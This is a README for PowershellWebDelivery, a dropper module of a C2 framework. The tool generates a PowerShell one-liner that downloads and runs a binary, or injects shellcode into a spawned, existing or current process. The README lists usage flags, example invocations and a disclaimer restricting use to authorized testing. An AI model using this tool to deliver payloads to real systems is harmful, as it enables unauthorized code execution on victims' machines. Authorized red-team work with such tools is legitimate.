# PowershellWebDelivery

**PowershellWebDelivery** is a Python-based tool that generates a PowerShell one-liner to download and execute a payload from a local web server. It supports serving binary executables or raw shellcode and provides multiple injection options.

This dropper is integrated as a module in the [Exploration C2](https://github.com/maxDcb/C2TeamServer) framework.


## Features

* Serve and execute PE binaries via PowerShell
* Inject raw shellcode into newly spawned or existing processes
* Generate a one-liner PowerShell payload for remote execution
* Minimal dependencies, fast setup

## Usage

```bash
PowershellWebDelivery.py -i <ip> -p <port> [options]
```

### Required Arguments

* `-i, --ip <ip>`
  IP address or hostname of the server hosting the payload.

* `-p, --port <port>`
  Port number to serve the payload.

### Payload Options

* `-b, --binary <path>`
  Path to the binary to serve and execute (e.g., `./calc.exe`).

* `-a, --args "<args>"`
  Optional arguments to pass to the binary upon execution.

* `-r, --raw <path>`
  Path to raw shellcode (`.raw` file) to inject instead of a binary.

### Injection Options

* `-s, --spawnProcess <name>`
  Name of a process to spawn and inject into (e.g., `notepad.exe`).

* `-d, --pid <pid>`
  PID of an existing process to inject into.

### Other

* `-h`
  Show help message and exit.

## Examples

```bash
# Serve and execute calc.exe with no arguments
PowershellWebDelivery.py -i 127.0.0.1 -p 8000 -b ./calc.exe

# Serve and execute calc.exe with arguments
PowershellWebDelivery.py -i 127.0.0.1 -p 8000 -b ./calc.exe -a "-winmode hide"

# Serve and inject raw shellcode into a newly spawned process
PowershellWebDelivery.py -i 127.0.0.1 -p 8000 -r ./payload.raw -s notepad.exe

# Serve and inject raw shellcode into a specific process by PID
PowershellWebDelivery.py -i 127.0.0.1 -p 8000 -r ./payload.raw -d 1234
```

## Notes

* The generated PowerShell one-liner will be printed to the console.
* Ensure the target system can download and execute the payload from the hosting server.
* Use either `-b` (binary) or `-r` (raw shellcode), not both.
* Use either `-s` (spawn process) or `-d` (existing PID), not both. If neither is specified, the shellcode will self-inject.

## Disclaimer

This tool is intended for educational and authorized penetration testing use only. Unauthorized use is prohibited.


